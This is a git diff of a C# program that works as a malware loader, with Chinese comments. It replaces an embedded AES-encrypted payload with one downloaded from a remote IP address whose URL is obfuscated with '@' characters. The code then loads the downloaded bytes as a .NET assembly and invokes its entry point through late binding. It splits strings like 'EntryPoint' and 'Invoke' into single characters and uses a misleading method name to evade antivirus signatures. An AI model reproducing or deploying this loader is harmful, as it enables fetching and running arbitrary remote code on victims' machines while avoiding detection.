@@ -1,35 +1,43 @@
 using System;
 using System.IO;
+using System.Net;
 using System.Security.Cryptography;
 using Microsoft.VisualBasic.CompilerServices;
-
-namespace xx
+using System.Reflection;
+namespace loaderx
 {
-    public static class XXX
+    public static class clearx
     {
         public static void Main()
         {
-
-            byte[] Key = Convert.FromBase64String("fRZstgVonklWpSLeb9ZKcoDkGPzHwDqSAMyTxoopGcb=");
-            byte[] IV = Convert.FromBase64String("pyvelrU+SBPM/2MWEftieA==");
-            string m = "*VqQ##M####E"  //base64加密密文
-            byte[] Bytes = Convert.FromBase64String(m.Replace("#", "A").Replace("*", "T"));
-            byte[] encshell = AESEncryptShellCode(Bytes, Key, IV);
-            byte[] decshell = AESDecryptor(encshell, Key, IV);
-            
-            object Assembly = Assembly_Load(decshell);
+            try
+            {
+                WebClient client = new WebClient();
+                string m = client.DownloadString("ht@tp@:/@/1@0.2@12@.20@2.18@8:88@48/bas@e64en@c@ode.t@xt".Replace("@", ""));
+                
+                byte[] Bytes = Convert.FromBase64String(m);
+                object OldGreen = ThreeHundredSixtyWorldNumberOne(Bytes);
+            }
+            catch
+            {
+                Console.WriteLine("加载错误，请尝试其它方法");
+            }
         }
-        public static byte[] Assembly_Load(byte[] Bytes)
+
+        public static byte[] ThreeHundredSixtyWorldNumberOne(byte[] Bytes)
         { 
             object Nothin = null;
             object Objec = new object[0] { };
             object NewObje = new object[][] { (object[])Nothin, (object[])Nothin };
-            System.Object Reflectio = System.Reflection.Assembly.Load(Bytes);
-            
-            object LateCall = NewLateBinding.LateGet(Reflectio, (Type)Nothin, "Entry" + "Point", (object[])Objec, (string[])Nothin, (Type[])Nothin, (bool[])Nothin);
-            object Binding = NewLateBinding.LateCall(LateCall, (Type)Nothin, "Inv" + "oke", (object[])NewObje, (string[])Nothin, (Type[])Nothin, (bool[])Nothin, true);
-            return (byte[])Binding;
+
+            Object Reflectio5 = Assembly.Load(Bytes);
+            object LateCall = NewLateBinding.LateGet(Reflectio5, (Type)Nothin, "E" + "n" + "t" + "r" + "y" + "P" + "o" + "i" + "n" + "t", (object[])Objec, (string[])Nothin, (Type[])Nothin, (bool[])Nothin);
+            object Green = NewLateBinding.LateCall(LateCall, (Type)Nothin, "I" + "n" + "v" + "o" + "k" + "e", (object[])NewObje, (string[])Nothin, (Type[])Nothin, (bool[])Nothin, true);
+            return (byte[])null;
         }
+    
+
+
         //异或算法
         private static byte[] XOREncryptDecrypt(byte[] baShellcode, byte[] baXorKey)
         {
